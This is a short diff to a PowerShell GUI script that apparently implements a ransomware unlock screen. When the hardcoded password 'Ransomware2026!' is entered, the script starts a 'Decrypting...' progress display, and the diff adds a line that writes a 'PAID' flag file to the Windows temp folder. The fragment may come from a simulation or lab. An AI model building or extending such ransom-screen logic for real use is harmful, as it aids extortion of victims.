@@ -71,6 +71,9 @@ $button.Add_Click({
 
     if ($prompt.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
         if ($txtPass.Text -eq "Ransomware2026!") {
+            # --- NEW: CREATE THE SHARED FLAG FILE ---
+            "PAID" | Out-File -FilePath "C:\Windows\Temp\PAID.txt" -Encoding ascii
+            
             $button.Enabled = $false
             $button.Text = "Decrypting..."
             for ($i = 0; $i -le 100; $i += 7) {
